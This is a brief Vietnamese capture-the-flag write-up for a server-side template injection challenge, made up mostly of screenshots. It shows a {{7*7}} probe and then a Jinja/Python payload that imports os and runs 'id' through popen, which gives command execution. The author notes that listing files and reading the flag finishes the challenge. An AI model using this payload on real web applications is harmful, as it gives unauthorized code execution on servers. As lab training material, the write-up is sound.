![image](https://github.com/user-attachments/assets/01dbbe3b-f7c9-47b7-9dc0-a84762fe96de)

Do bài tên là ssti nên tôi dùng thử `{{7*7}}` để test:

![image](https://github.com/user-attachments/assets/3d4c491d-a28a-4fa9-a4c5-ff8f972994a9)

![image](https://github.com/user-attachments/assets/adb89204-e9f0-4a35-8099-5d6e5dd15817)

![image](https://github.com/user-attachments/assets/2ce4ebf8-7e31-400d-86d2-8dc51348cd75)

Kết hợp với thông tin nó sự dụng python, tôi dùng thử payload `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` và nó chạy:

![image](https://github.com/user-attachments/assets/ded0b24b-e17f-4435-9b81-a71a71256641)

Giờ ls và cat flag là xong

![image](https://github.com/user-attachments/assets/4be11990-5e1b-4ab1-9f87-aa4201d09966)

